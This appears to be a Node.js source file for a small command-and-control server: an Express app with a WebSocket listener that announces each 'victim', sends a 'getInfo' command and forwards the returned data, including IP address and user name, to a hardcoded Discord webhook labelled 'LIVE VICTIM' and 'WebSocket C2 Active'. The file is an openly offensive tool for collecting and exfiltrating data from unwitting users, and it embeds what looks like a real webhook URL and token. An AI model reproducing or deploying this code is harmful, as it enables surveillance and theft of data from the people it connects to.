const express = require('express');
const WebSocket = require('ws');
const app = express();

app.use(express.static('.'));

const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', ws => {
    console.log('🎯 New Victim Connected!');
    
    // Send payload
    ws.send(JSON.stringify({
        cmd: 'getInfo',
        data: {
            screen: `${Math.random()*1920}x${Math.random()*1080}`,
            battery: Math.random()*100
        }
    }));
    
    ws.on('message', data => {
        const info = JSON.parse(data);
        console.log('📡 Victim Data:', info);
        
        // Forward to Discord
        fetch('https://discord.com/api/webhooks/1494713788824551556/2Se1uUIMJq8hxKCGHzIy7UmPS5V4G_OXR10Gr-E-_Y9abZeEKBKuDsYCQuN6DiPRpN3M', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: `**🔥 LIVE VICTIM** ${info.ip} - ${info.user}`,
                embeds: [{title: 'WebSocket C2 Active', description: JSON.stringify(info), color: 0x00ff00}]
            })
        });
    });
});

app.listen(3000, () => console.log('🌐 Server: http://localhost:3000'));
